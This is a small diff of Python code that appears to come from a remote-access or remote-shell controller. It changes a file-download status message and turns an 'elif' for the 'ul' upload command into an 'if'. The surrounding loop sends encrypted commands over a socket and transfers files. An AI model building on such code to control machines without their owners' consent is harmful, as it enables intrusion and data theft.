@@ -86,7 +86,7 @@ while True:
         f = open(data[0], 'wb')
         f.write(data[1])
         f.close()
-        pr('🍺 File dl success')
+        pr('🍺 File dl ✅')
       except Exception as e:
         pr('⚠️', e)
       Send(sock, cipher, 'pwd')
@@ -99,7 +99,7 @@ while True:
       close(sock, client)
       break
 
-    elif nc.startswith('ul '):
+    if nc.startswith('ul '):
       fn = nc[3:].strip()
       try:
         f = open(fn, 'rb')
